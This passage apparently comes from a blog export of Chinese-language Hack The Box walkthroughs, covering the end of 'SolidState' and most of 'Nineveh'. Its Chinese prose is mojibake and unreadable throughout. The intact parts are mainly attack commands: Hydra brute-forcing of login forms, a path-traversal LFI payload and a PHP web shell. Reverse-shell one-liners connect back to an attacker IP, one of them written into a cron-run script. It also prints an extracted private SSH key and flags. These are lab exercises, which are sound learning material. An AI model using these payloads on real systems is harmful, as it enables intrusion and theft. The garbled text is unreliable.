Phoenix start script.\n#\n\n# OS specific support.  $var _must_ be set to either true or false.\ncygwin=false\ncase \"`uname`\" in\nCYGWIN*) cygwin=true;;\nesac\n\n# resolve links - $0 may be a softlink\nTHIS_PROG=\"$0\"\n\nwhile [ -h \"$THIS_PROG\" ]; do\n  ls=`ls -ld \"$THIS_PROG\"`\n  link=`expr \"$ls\" : '.*-> \\(.*\\)$'`\n  if expr \"$link\" : '.*/.*' > /dev/null; then\n    THIS_PROG=\"$link\"\n  else\n    THIS_PROG=`dirname \"$THIS_PROG\"`/\"$link\"\n  fi\ndone\n\n# Get standard environment variables\nPRGDIR=`dirname \"$THIS_PROG\"`\nPHOENIX_HOME=`cd \"$PRGDIR/..\" ; pwd`\n\nunset THIS_PROG\n\n# For Cygwin, ensure paths are in UNIX format before anything is touched\nif $cygwin; then\n  [ -n \"$PHOENIX_HOME\" ] && PHOENIX_HOME=`cygpath --unix \"$PHOENIX_HOME\"`\nfi\n\n$PHOENIX_HOME/bin/phoenix.sh run $*\n```\næ²¡çœ‹åˆ°å•¥æœ‰ç”¨çš„ä¸œè¥¿\n\nä½†æ˜¯å¯ä»¥ç¡®å®šçš„æ˜¯è‚¯å®šå’Œ opt ç›®å½•ä¸‹çš„ä¸œè¥¿æœ‰å…³ï¼Œå’±ä»¬å»çœ‹çœ‹\n\n```bash\n${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la\ntotal 16\ndrwxr-xr-x  3 root root 4096 Aug 22  2017 .\ndrwxr-xr-x 22 root root 4096 May 27 11:05 ..\ndrwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2\n-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py\n```\nè¿™è¾¹æœ‰ç‚¹å¼‚å¸¸ï¼Œåœ¨ /opt ç›®å½•ä¸‹å‘ç°ä¸€ä¸ª tmp.py çš„æ–‡ä»¶ï¼Œæƒé™æ˜¯ 777 çš„\n\n```bash\n${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py \n#!/usr/bin/env python\nimport os\nimport sys\ntry:\n     os.system('rm -r /tmp/* ')\nexcept:\n     sys.exit()\n```\nè¿™è¾¹çœ‹ç€åƒæ˜¯ä¸ªå®æ—¶è¿è¡Œçš„è„šæœ¬ï¼Œå°è¯•å†™å…¥åå¼¹ shell çš„ä¸œè¥¿\n\n```bash\necho \"import os;os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 4444 >/tmp/f')\" > /opt/tmp.py\n```\nç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                      \nlistening on [any] 4444 ...\nconnect to [10.10.14.19] from (UNKNOWN) [10.10.10.51] 37764\n/bin/sh: 0: can't access tty; job control turned off\n# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸæ‹¿åˆ° root æƒé™\n\n```bash\n# cat /root/root.txt\n096c5f57afdfe824d5827ea17af7756c\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Nineveh - Hackthebox","url":"/2022/07/08/Hackthebox/Medium/Hackthebox-Nineveh/","content":"\n# Hackthebox - Nineveh\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Nineveh/3241f2e3-61a5-4ea3-9236-6dae2163a58f.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Nineveh/b36799a5-9199-43ae-88ad-c421c7a18ed5.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.43\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 09:06 CST\nNmap scan report for 10.10.10.43\nHost is up (0.35s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT    STATE SERVICE  VERSION\n80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n| tls-alpn: \n|_  http/1.1\n|_http-title: 400 Bad Request\n| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR\n| Not valid before: 2017-07-01T15:03:30\n|_Not valid after:  2018-07-01T15:03:30\n|_ssl-date: TLS randomness does not represent time\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.10 - 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 (91%), Linux 3.16 - 4.6 (91%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%), Linux 4.2 (91%), Linux 4.4 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   345.03 ms 10.10.14.1\n2   343.72 ms 10.10.10.43\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 75.37 seconds\n```\n## Http\n![](Hackthebox-Nineveh/1fe1e35c-96a2-487e-aedf-99d1fb72110c.png)\n\n## Https\n![](Hackthebox-Nineveh/4db315eb-539a-4ba8-9abe-a4e2897d7a1e.png)\n\nhttp å’Œ https éƒ½æ²¡æœ‰ä»€ä¹ˆå¯ç”¨çš„ä¸œè¥¿ï¼Œè¿›è¡Œ fuzz çœ‹ä¸€ä¸‹\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# ffuf -u 'http://10.10.10.43/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.43/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\nserver-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 341ms]\n                        [Status: 200, Size: 178, Words: 22, Lines: 6, Duration: 345ms]\ndepartment              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 342ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 289 req/sec :: Duration: [0:02:52] :: Errors: 59 ::\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# ffuf -u 'https://10.10.10.43/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://10.10.10.43/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\ndb                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 1489ms]\nserver-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 351ms]\n                        [Status: 200, Size: 49, Words: 3, Lines: 2, Duration: 378ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 134 req/sec :: Duration: [0:05:04] :: Errors: 38 ::\n```\né¦–å…ˆçœ‹ä¸€ä¸‹ http çš„å†…å®¹\n\n![](Hackthebox-Nineveh/17c2ed60-e7d9-4c8b-a9c1-bf6fb986b8f1.png)\n\nè¿™è¾¹æœ‰ä¸ªç™»å½•å£ï¼Œå¯ä»¥å¯¹è´¦å·è¿›è¡Œéå†ï¼Œå¾—åˆ°äº†ä¸€ä¸ªè´¦å· adminï¼Œå¯¹å¯†ç è¿›è¡Œä¸€ä¸‹å°è¯•çˆ†ç ´\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -V -f http-post-form '/department/login.php:username=^USER^&password=^PASS^:invalid password'\nHydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-07 14:11:26\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=^USER^&password=^PASS^:invalid password\n\n[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t\n[STATUS] attack finished for 10.10.10.43 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-07 14:38:57\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ªè´¦å·å¯†ç \n\n```bash\nusername = admin\npassword = 1q2w3e4r5t\n```\n![](Hackthebox-Nineveh/ac278010-6e8b-44f9-8520-0f011079c659.png)\n\næˆåŠŸç™»å…¥åå°\n\n# æ¼æ´åˆ©ç”¨\n```bash\nHave you fixed the login page yet! hardcoded username and password is really bad idea!\n\ncheck your serect folder to get in! figure it out! this is your challenge\n\nImprove the db interface.\n~amrois\n```\nåœ¨ notes ä¸­å‘ç°äº†ä¸€ä¸ªæç¤º\n\n![](Hackthebox-Nineveh/f45a0cea-3067-4971-97f9-58e5409ef69e.png)\n\nè¿™è¾¹çš„åŸŸåå¾ˆæœ‰è¶£ï¼Œ[http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt](http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt) æˆ‘çŒœæµ‹åº”è¯¥æ˜¯å…·æœ‰ LFI çš„ï¼Œå°è¯•è¿›è¡Œåˆ©ç”¨\n\n![](Hackthebox-Nineveh/6f30aa96-c154-408d-8c01-fd3eb2e6a17e.png)\n\n```bash\nhttp://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd\n```\næˆåŠŸç»•è¿‡è·å¾—ä¸€ä¸ª LFI æ¼æ´\n\n```bash\nhttp://10.10.10.43/department/manage.php?notes=/ninevehNotes.txt/../etc/passwd\n```\nå¯¹ poc é•¿åº¦è¿›è¡Œäº†ä¸€ä¸‹ç®€åŒ–\n\n![](Hackthebox-Nineveh/2dd1d92c-eaed-4a08-9d01-18da1894595c.png)\n\nè¿™è¾¹æ‰¾åˆ°ä¸€ä¸ª phpinfo é¡µé¢\n\n```bash\nhttp://10.10.10.43/info.php\n```\næš‚æ—¶æ²¡ä»€ä¹ˆæ€è·¯è¿›è¡Œç ´è§£ï¼Œçœ‹çœ‹ https çš„å†…å®¹å§\n\n![](Hackthebox-Nineveh/38c4a437-8d59-46da-820f-116460d3f479.png)\n\nè¿™è¾¹è¿˜æ˜¯éœ€è¦çˆ†ç ´\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# hydra 10.10.10.43 -l admin -P /usr/share/wordlists/rockyou.txt -V -f https-post-form '/db/index.php:password=^PASS^&remember=yes&logn=Log+In&proc_login=true:Incorrect password'\nHydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-07 15:05:26\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&logn=Log+In&proc_login=true:Incorrect password\n\n[443][http-post-form] host: 10.10.10.43   login: admin   password: password123\n[STATUS] attack finished for 10.10.10.43 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-07 15:34:26\n```\nè·å¾—äº†ä¸€ä¸ªå¯†ç  password123\n\n![](Hackthebox-Nineveh/f6835434-2c32-48af-86bb-03e5eeafa4e1.png)\n\næˆåŠŸè¿›å…¥ç®¡ç†é¢æ¿\n\n> [https://www.exploit-db.com/exploits/24044](https://www.exploit-db.com/exploits/24044)\n\næ ¹æ®é¢æ¿çš„ç‰ˆæœ¬ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªè¿œç¨‹ PHP ä»£ç æ³¨å…¥\n\n![](Hackthebox-Nineveh/261b830f-8029-49a5-a9df-4e34dad9b5b2.png)\n\næ–°å»ºä¸€ä¸ªæ–‡ç« \n\n```bash\n<?php echo system($_REQUEST[\"cmd\"]);?>\n```\nç„¶åå†™å…¥ä¸€å¥è¯æœ¨é©¬\n\n![](Hackthebox-Nineveh/c82d5236-6a4a-4f52-b162-33c5e7711a09.png)\n\n![](Hackthebox-Nineveh/64d8edd5-29e3-47c5-89a4-ce91f7b44a5a.png)\n\næ¥ç€ä¿®æ”¹ä¸€ä¸‹åŠ è½½çš„åº“\n\n![](Hackthebox-Nineveh/552fc014-21eb-4f5f-a7ae-dede4160395d.png)\n\næˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œæ¥ç€æ„é€ ä¸€ä¸ªåå¼¹ shell çš„ poc\n\n```bash\nhttp://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.19+4444+%3E/tmp/f\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.19] from (UNKNOWN) [10.10.10.43] 57110\n/bin/sh: 0: can't access tty; job control turned off\n$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")';\nwww-data@nineveh:/var/www/html/department$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸå¾—åˆ°ä¸€ä¸ª shel\n\n# æƒé™æå‡\n## User\n```bash\nwww-data@nineveh:/var/www/ssl/secure_notes$ ls\nls\nindex.html  nineveh.png\nwww-data@nineveh:/var/www/ssl/secure_notes$ file nineveh.png\nfile nineveh.png\nnineveh.png: PNG image data, 1497 x 746, 8-bit/color RGB, non-interlaced\n```\nåœ¨ /var/www/ssl/secure\\_notes ç›®å½•ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªåä¸º nineveh.png çš„å›¾ç‰‡ï¼Œå»è®¿é—®ä¸€ä¸‹çœ‹çœ‹\n\n> [https://10.10.10.43/secure\\_notes/nineveh.png](https://10.10.10.43/secure_notes/nineveh.png)\n\n![](Hackthebox-Nineveh/3f201058-4faf-46aa-8417-1ea71b8847f2.png)\n\nåœ¨è¿™æ˜¾ç¤ºä¸ªè¿™ä¸ªï¼Œè‚¯å®šä¸å¤ªå¯¹åŠ²ï¼Œä¼°è®¡æ˜¯æœ‰æ–‡ä»¶éšå†™ï¼ŒæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nwww-data@nineveh:/var/www/ssl/secure_notes$ strings nineveh.png\nstrings nineveh.png\n```\n```bash\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI\nH9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU\nPdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5\nFQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI\n3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT\nX+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn\nKiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk\nFYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z\nGRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR\nJZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo\n9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu\nBato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb\nujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl\n1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b\nvCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx\nDdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89\nP+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC\nfGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i\ntYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC\niEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1\nMxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh\nPNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse\ni6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc\nil6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7\nfw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG\n-----END RSA PRIVATE KEY-----\nsecret/nineveh.pub\n0000644\n0000041\n0000041\n00000000620\n13126060277\n014541\nustar  \nwww-data\nwww-data\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb\n```\næ‰¾åˆ°äº†ä¸€ä¸² sshkey\n\n```bash\nwww-data@nineveh:/var/www/ssl/secure_notes$ cat /etc/passwd |grep bash\ncat /etc/passwd |grep bash\nroot:x:0:0:root:/root:/bin/bash\namrois:x:1000:1000:,,,:/home/amrois:/bin/bash\n```\næ‰¾åˆ°äº†æˆ‘ä»¬å¯ä»¥ç™»é™†çš„è´¦æˆ· amrois ç„¶åæŠŠ sshkey ä¿å­˜ä¸º id\\_rsa ç»™äºˆ 600 æƒé™\n\n```bash\nchmod 600 id_rsa\n```\næµ‹è¯•åå‘ç° 22 ç«¯å£æ²¡æœ‰æ‰“å¼€ï¼Œæˆ‘ä»¬è¿˜å¾—æƒ³åŠæ³•æ‰“å¼€ 22 ç«¯å£\n\n```bash\nwww-data@nineveh:/var/www/html/department$ cat /etc/knockd.conf\ncat /etc/knockd.conf\n[options]\n logfile = /var/log/knockd.log\n interface = ens160\n\n[openSSH]\n sequence = 571, 290, 911 \n seq_timeout = 5\n start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\n tcpflags = syn\n\n[closeSSH]\n sequence = 911,290,571\n seq_timeout = 5\n start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\n tcpflags = syn\n```\næ‰¾åˆ°äº†ä¸€ä¸ªæ–‡ä»¶ï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹ï¼Œç™¾åº¦äº†ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªç«¯å£æ•²é—¨\n\n> [https://lingwu111.github.io/ç«¯å£æ•²é—¨æŠ€æœ¯.html](https://lingwu111.github.io/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8%E6%8A%80%E6%9C%AF.html)\n\næ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œè®²è§£äº†ç«¯å£æ•²é—¨çš„åŸç†\n\nç®€å•çš„è¯´ï¼Œå°±æ˜¯æˆ‘ä»¬å¾—ä¾æ¬¡è®¿é—® 571ã€290ã€911 è¿™ä¸‰ä¸ªç«¯å£ï¼Œç„¶åè¾¾æˆä¸€ä¸ªå©å©å©æ•²é—¨çš„æ•ˆæœï¼Œç„¶åé˜²ç«å¢™å°±ä¼šæ¥å¼€é—¨ï¼ŒæŠŠ 22 ç«¯å£å‘æˆ‘ä»¬å¼€æ”¾\n\n```bash\nfor x in 571 290 911 ; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.43; done\n```\nç¼–å†™å¥½ç›¸å…³è¯­å¥ï¼Œå»å¼€å§‹æ•²é—¨å§\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nmap -p22 10.10.10.43                                                                        \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST\nNmap scan report for 10.10.10.43\nHost is up (0.42s latency).\n\nPORT   STATE    SERVICE\n22/tcp filtered ssh\n\nNmap done: 1 IP address (1 host up) scanned in 4.79 seconds\n\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# for x in 571 290 911 ; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.43; done\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST\nWarning: 10.10.10.43 giving up on port because retransmission cap hit (0).\nNmap scan report for 10.10.10.43\nHost is up.\n\nPORT    STATE    SERVICE\n571/tcp filtered umeter\n\nNmap done: 1 IP address (1 host up) scanned in 1.07 seconds\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST\nWarning: 10.10.10.43 giving up on port because retransmission cap hit (0).\nNmap scan report for 10.10.10.43\nHost is up.\n\nPORT    STATE    SERVICE\n290/tcp filtered unknown\n\nNmap done: 1 IP address (1 host up) scanned in 1.07 seconds\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST\nWarning: 10.10.10.43 giving up on port because retransmission cap hit (0).\nNmap scan report for 10.10.10.43\nHost is up.\n\nPORT    STATE    SERVICE\n911/tcp filtered xact-backup\n\nNmap done: 1 IP address (1 host up) scanned in 1.08 seconds\n\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nmap -p22 10.10.10.43                                                                        \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST\nNmap scan report for 10.10.10.43\nHost is up (0.38s latency).\n\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 0.83 seconds\n```\næˆåŠŸæ•²å¼€ 22 ç«¯å£\n\nå»è¿æ¥ ssh\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# ssh amrois@10.10.10.43 -i id_rsa\nThe authenticity of host '10.10.10.43 (10.10.10.43)' can't be established.\nED25519 key fingerprint is SHA256:kxSpgxC8gaU9OypTJXFLmc/2HKEmnDMIjzkkUiGLyuI.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.43' (ED25519) to the list of known hosts.\nUbuntu 16.04.2 LTS\nWelcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n288 packages can be updated.\n207 updates are security updates.\n\nYou have mail.\nLast login: Mon Jul  3 00:19:59 2017 from 192.168.0.14\namrois@nineveh:~$ whoami&&id\namrois\nuid=1000(amrois) gid=1000(amrois) groups=1000(amrois)\n```\næˆåŠŸææƒåˆ° user æƒé™\n\n```bash\namrois@nineveh:~$ ls\nuser.txt\namrois@nineveh:~$ cat user.txt \ne451f28264547fd414a407d0c8fccb78\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n## Root\né¦–å…ˆè·‘ä¸€ä¸ª linpeas.sh\n\n```bash\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ SGID\nâ•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            \n-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/pam_extrausers_chkpwd                                                                                                                                                                       \n-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/unix_chkpwd\n-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter\n-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write\n-rwxr-sr-x 1 root utmp 425K Feb  7  2016 /usr/bin/screen  --->  GNU_Screen_4.5.0\n-rwxr-sr-x 1 root shadow 61K Mar 29  2016 /usr/bin/chage\n-rwxr-sr-x 1 root mlocate 39K Nov 18  2014 /usr/bin/mlocate\n-rwxr-sr-x 1 root ssh 351K Mar 16  2017 /usr/bin/ssh-agent\n-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab\n-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)\n-rwxr-sr-x 1 root shadow 23K Mar 29  2016 /usr/bin/expiry\n-rwxr-sr-x 1 root tty 27K Dec 16  2016 /usr/bin/wall\n```\nè¿™è¾¹æ˜¯çœ‹åˆ°æœ‰æƒé™å¯¹ crontab è¿›è¡Œæ‰§è¡Œçš„ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\namrois@nineveh:~$ crontab -l\n# Edit this file to introduce tasks to be run by cron.\n# \n# Each task to run has to be defined through a single line\n# indicating with different fields when the task will be run\n# and what command to run for the task\n# \n# To define the time you can provide concrete values for\n# minute (m), hour (h), day of month (dom), month (mon),\n# and day of week (dow) or use '*' in these fields (for 'any').# \n# Notice that tasks will be started based on the cron's system\n# daemon's notion of time and timezones.\n# \n# Output of the crontab jobs (including errors) is sent through\n# email to the user the crontab file belongs to (unless redirected).\n# \n# For example, you can run a backup of all your user accounts\n# at 5 a.m every week with:\n# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/\n# \n# For more information see the manual pages of crontab(5) and cron(8)\n# \n# m h  dom mon dow   command\n*/10 * * * * /usr/sbin/report-reset.sh\n```\næ‰¾åˆ°äº†ä¸€ä¸ªè„šæœ¬\n\n```bash\namrois@nineveh:~$ cat /usr/sbin/report-reset.sh\n#!/bin/bash\n\nrm -rf /report/*.txt\n```\n```bash\namrois@nineveh:~$ ls -la /report/\ntotal 24\ndrwxr-xr-x  2 amrois amrois 4096 Jul  8 00:21 .\ndrwxr-xr-x 24 root   root   4096 Jan 29  2021 ..\n-rw-r--r--  1 amrois amrois 4815 Jul  8 00:20 report-22-07-08:00:20.txt\n-rw-r--r--  1 amrois amrois 4815 Jul  8 00:21 